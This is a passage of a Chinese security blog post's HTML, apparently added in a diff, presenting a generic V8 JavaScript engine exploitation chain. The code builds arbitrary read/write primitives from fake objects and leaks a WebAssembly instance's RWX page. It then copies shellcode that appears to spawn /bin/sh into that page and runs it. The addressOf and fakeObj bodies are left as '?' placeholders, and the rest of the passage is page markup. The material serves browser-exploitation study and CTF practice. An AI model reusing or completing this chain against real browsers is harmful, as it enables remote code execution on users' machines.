class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);<br><span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule, &#123;&#125;);<br><span class="hljs-keyword">var</span> f = wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br><br><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><span class="hljs-keyword">var</span> u32 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br><br><span class="hljs-comment">//32bit整型和64bit浮点类型转化</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">d2u</span>(<span class="hljs-params">v</span>) &#123;<br>  f64[<span class="hljs-number">0</span>] = v;<br>  <span class="hljs-keyword">return</span> u32;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">u2d</span>(<span class="hljs-params">lo, hi</span>) &#123;<br>  u32[<span class="hljs-number">0</span>] = lo;<br>  u32[<span class="hljs-number">1</span>] = hi;<br>  <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-comment">//64bit整型和64bit浮点类型转化</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">f</span>)<br>&#123;<br>  f64[<span class="hljs-number">0</span>] = f;<br>    <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itof</span>(<span class="hljs-params">i</span>)<br>&#123;<br>    bigUint64[<span class="hljs-number">0</span>] = i;<br>    <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br>&#123;<br>    <span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObj</span>(<span class="hljs-params">addr_to_fake</span>)<br>&#123;<br>    ?<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj_to_leak</span>)<br>&#123;<br>    ?<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>)<br>&#123;<br>    fake_array[<span class="hljs-number">1</span>] = <span class="hljs-title function_">itof</span>(addr - <span class="hljs-number">0x8n</span> + <span class="hljs-number">0x1n</span>);<br>    <span class="hljs-keyword">return</span> fake_object[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64</span>(<span class="hljs-params">addr, data</span>)<br>&#123;<br>    fake_array[<span class="hljs-number">1</span>] = <span class="hljs-title function_">itof</span>(addr - <span class="hljs-number">0x8n</span> + <span class="hljs-number">0x1n</span>);<br>    fake_object[<span class="hljs-number">0</span>] = <span class="hljs-title function_">itof</span>(data);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy_shellcode_to_rwx</span>(<span class="hljs-params">shellcode, rwx_addr</span>)<br>&#123;<br>  <span class="hljs-keyword">var</span> data_buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(shellcode.<span class="hljs-property">length</span> * <span class="hljs-number">8</span>);<br>  <span class="hljs-keyword">var</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_lo = <span class="hljs-title function_">addressOf</span>(data_buf) + <span class="hljs-number">0x18n</span>;<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr_up = buf_backing_store_addr_lo + <span class="hljs-number">0x8n</span>;<br>  <span class="hljs-keyword">var</span> lov = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_lo))[<span class="hljs-number">0</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_lo = <span class="hljs-title function_">u2d</span>(lov, <span class="hljs-title function_">d2u</span>(rwx_addr)[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">var</span> hiv = <span class="hljs-title function_">d2u</span>(<span class="hljs-title function_">read64</span>(buf_backing_store_addr_up))[<span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">var</span> rwx_page_addr_hi = <span class="hljs-title function_">u2d</span>(<span class="hljs-title function_">d2u</span>(rwx_addr, hiv)[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">var</span> buf_backing_store_addr = <span class="hljs-title function_">ftoi</span>(<span class="hljs-title function_">u2d</span>(lov, hiv));<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] buf_backing_store_addr: 0x&quot;</span>+<span class="hljs-title function_">hex</span>(buf_backing_store_addr));<br><br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_lo, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_lo));<br>  <span class="hljs-title function_">write64</span>(buf_backing_store_addr_up, <span class="hljs-title function_">ftoi</span>(rwx_page_addr_hi));<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.<span class="hljs-property">length</span>; ++i)<br>    data_view.<span class="hljs-title function_">setFloat64</span>(i * <span class="hljs-number">8</span>, <span class="hljs-title function_">itof</span>(shellcode[i]), <span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-keyword">var</span> double_array = [<span class="hljs-number">1.1</span>];<br><span class="hljs-keyword">var</span> obj = &#123;<span class="hljs-string">&quot;a&quot;</span> : <span class="hljs-number">1</span>&#125;;<br><span class="hljs-keyword">var</span> obj_array = [obj];<br><span class="hljs-keyword">var</span> array_map = ?;<br><span class="hljs-keyword">var</span> obj_map = ?;<br><br><span class="hljs-keyword">var</span> fake_array = [<br>  array_map,<br>  <span class="hljs-title function_">itof</span>(<span class="hljs-number">0x4141414141414141n</span>)<br>];<br><br>fake_array_addr = <span class="hljs-title function_">addressOf</span>(fake_array);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak fake_array addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(fake_array_addr));<br>fake_object_addr = fake_array_addr - <span class="hljs-number">0x10n</span>;<br><span class="hljs-keyword">var</span> fake_object = <span class="hljs-title function_">fakeObj</span>(fake_object_addr);<br><span class="hljs-keyword">var</span> wasm_instance_addr = <span class="hljs-title function_">addressOf</span>(wasmInstance);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak wasm_instance addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(wasm_instance_addr));<br><span class="hljs-keyword">var</span> rwx_page_addr = <span class="hljs-title function_">read64</span>(wasm_instance_addr + <span class="hljs-number">0x68n</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="hljs-title function_">hex</span>(<span class="hljs-title function_">ftoi</span>(rwx_page_addr)));<br><br><span class="hljs-keyword">var</span> shellcode = [<br>  <span class="hljs-number">0x2fbb485299583b6an</span>,<br>  <span class="hljs-number">0x5368732f6e69622fn</span>,<br>  <span class="hljs-number">0x050f5e5457525f54n</span><br>];<br><br><span class="hljs-title function_">copy_shellcode_to_rwx</span>(shellcode, rwx_page_addr);<br><span class="hljs-title function_">f</span>();<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/V8/" class="category-chain-item">V8</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/v8/" class="print-no-link">#v8</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>V8通用利用链</div>
+      <div>http://akaieurus.github.io/2023/04/12/V8通用利用链/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/13/starctf-2019-OOB/" title="2019 starctf OOB">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2019 starctf OOB</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/03/03/house-of-husk/" title="house of husk">
+                        <span class="hidden-mobile">house of husk</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
